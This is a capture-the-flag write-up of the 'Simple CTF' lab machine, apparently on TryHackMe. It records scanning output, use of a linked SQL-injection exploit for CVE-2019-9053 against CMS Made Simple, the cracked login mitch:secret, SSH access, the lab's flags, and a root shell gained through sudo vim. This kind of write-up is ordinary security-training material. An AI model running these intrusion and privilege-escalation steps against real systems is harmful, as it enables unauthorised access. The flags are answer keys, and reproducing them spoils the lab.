---
date: 2024-10-16
title: Simple CTF THM Write-Up
machine_ip: varies
os: Linux
difficulty: Easy
my_rating: 2
tags:
  - Linux
  - PrivEsc
  - CVE-2019-9053
  - nmap
  - feroxbuster
  - php
  - vim
  - GTFOBins
  - LOLBINS
  - sudo
  - SQLInjection
  - passwordattacks
  - Apache
  - CMS
  - ssh
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~/Transfer]
└─# nmap -A -p- -sVC 10.10.54.127 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 15:25 PDT
Nmap scan report for 10.10.54.127
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.1.119
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 5.X|3.X (89%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 5.4 (89%), Linux 3.10 - 3.13 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   44.32 ms  10.2.0.1
2   ... 3
4   207.24 ms 10.10.54.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 335.22 seconds
```
- FTP has anonymous login enabled


- Web enumeration
	- feroxbuster
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r --url http://10.10.54.127
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.54.127
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://10.10.54.127/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.10.54.127/
404      GET        9l       33w      288c http://10.10.54.127/Reports%20List
200      GET        1l       20w     3039c http://10.10.54.127/simple/uploads/simplex/js/functions.min.js
200      GET       26l      374w    26556c http://10.10.54.127/simple/uploads/simplex/js/jquery.sequence-min.js
200      GET       78l      274w     4618c http://10.10.54.127/simple/admin/login.php
200      GET      127l     1182w    19913c http://10.10.54.127/simple/
200      GET        0l        0w        0c http://10.10.54.127/simple/uploads/
404      GET        9l       33w      289c http://10.10.54.127/Style%20Library
200      GET        1l        0w        2c http://10.10.54.127/simple/uploads/simplex/
200      GET        1l        5w       24c http://10.10.54.127/simple/lib/
200      GET        0l        0w        0c http://10.10.54.127/simple/uploads/images/
200      GET       22l      126w     2150c http://10.10.54.127/simple/assets/
200      GET     2615l     6486w    53969c http://10.10.54.127/simple/admin/loginstyle.php
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/MenuManager/
200      GET        1l        5w       24c http://10.10.54.127/simple/doc/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/MenuManager/templates/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/templates/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/css/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/configs/
200      GET        1l        0w        2c http://10.10.54.127/simple/uploads/simplex/js/
200      GET        0l        0w        0c http://10.10.54.127/simple/tmp/templates_c/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/MenuManager/lang/
200      GET        1l        5w       24c http://10.10.54.127/simple/uploads/simplex/fonts/
200      GET       28l      192w     3402c http://10.10.54.127/simple/modules/
200      GET       17l       71w     1152c http://10.10.54.127/simple/tmp/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/AdminSearch/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/FilePicker/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSContentManager/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CmsJobManager/
200      GET        0l        0w        0c http://10.10.54.127/simple/tmp/cache/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/images/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/plugins/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/admin_custom/
200      GET        0l        0w        0c http://10.10.54.127/simple/assets/module_custom/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/ModuleManager/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSMailer/
200      GET        1l        5w       24c http://10.10.54.127/simple/lib/plugins/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/Navigator/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/AdminSearch/images/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/AdminSearch/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/FilePicker/templates/
200      GET       16l       60w      999c http://10.10.54.127/simple/modules/FilePicker/js/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSContentManager/images/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CmsJobManager/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/MicroTiny/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSContentManager/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/ModuleManager/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSMailer/images/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/CMSMailer/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/ModuleManager/images/
200      GET       17l       71w     1168c http://10.10.54.127/simple/lib/assets/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/Navigator/templates/
200      GET        1l        5w       24c http://10.10.54.127/simple/modules/AdminSearch/lib/
200      GET        1l        5w       24c 
```

- whatweb
```
┌──(root㉿kali)-[~/Transfer]
└─# whatweb 10.10.54.127             
http://10.10.54.127 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.54.127], Title[Apache2 Ubuntu Default Page: It works]  
```

- We find an #Apache  webserver `Apache 2.4.18` and many directories open to the public
- The website is running #CMS `CMS Made Simple version 2.2.8` after navigating to `http://10.10.54.127/simple`
- Also, we find and admin login portal at `http://10.10.54.127/simple/admin/login.php`
- We find a post about a new module installed by someone named `mitch`, may be our user

---

# Foothold

- gain shell via exploit
- We find an [exploit](https://www.exploit-db.com/exploits/46635) for CMS < 2.2.10 that performs unauthenticated SQL Injections to crack the login credentials #CVE-2019-9053 (Brute forces the salt, username, email, and password)
	- Running this exploit manually, as a python script is taking a while... standby
	- Machine required a reset, so the IP changed
	- During my script running, I get a Traceback error saying the server has closed connection. When I ping the box, I get nothing. I may be breaking the box but the script stopped at `1dac0d92e9fa62` in an attempt to crack the salt. 
	- Reset the box a second time, we got the salt for the password `1dac0d92e9fa6bb2`. Then the server closed again...
	- Happened again. This room/box is unstable...
	- Getting the password for this step online since it keeps breaking and proceeding solo after that
		- Appears I was correct in the vulnerability and exploit to use
		- `secret` is the password

- `mitch:secret` logs us into the admin web portal
- Using the #SSH port we found in the nmap scan, we can log in and get a shell
```
┌──(root㉿kali)-[~/Downloads]
└─# ssh mitch@10.10.218.42 -p 2222
mitch@10.10.218.42's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Thu Oct 17 03:19:20 2024 from 10.2.1.119
$ whoami
mitch
```

- User flag - mitch
```
$ cat user.txt
G00d j0b, keep up!
```

---

# PrivEsc

[[Privilege Escalation]], [[🦊TCM Security/PrivEsc_Windows/1_Initial_Enumeration]]
- escalate to root
- `mitch` user can run `vim` as `sudo`! We can try to use binaries to get a root shell
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

- Get a root shell
```
$ sudo vim -c ':!/bin/sh'

# whoami
root
```

- Root flag
```
# cat root.txt
W3ll d0n3. You made it!
```